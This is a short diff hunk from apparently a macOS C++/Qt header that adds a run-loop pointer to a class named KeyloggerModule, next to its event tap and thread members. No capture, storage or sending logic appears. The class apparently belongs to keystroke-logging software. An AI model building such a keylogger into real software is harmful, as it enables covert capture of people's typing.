@@ -63,6 +63,7 @@ private:
     static KeyloggerModule* instance;
     void* eventTap;       // CFMachPortRef
     void* runLoopSource;  // CFRunLoopSourceRef
+    void* tapRunLoop;     // CFRunLoopRef
     QThread* tapThread;
 
     static void* eventCallback(void* proxy, unsigned long type,
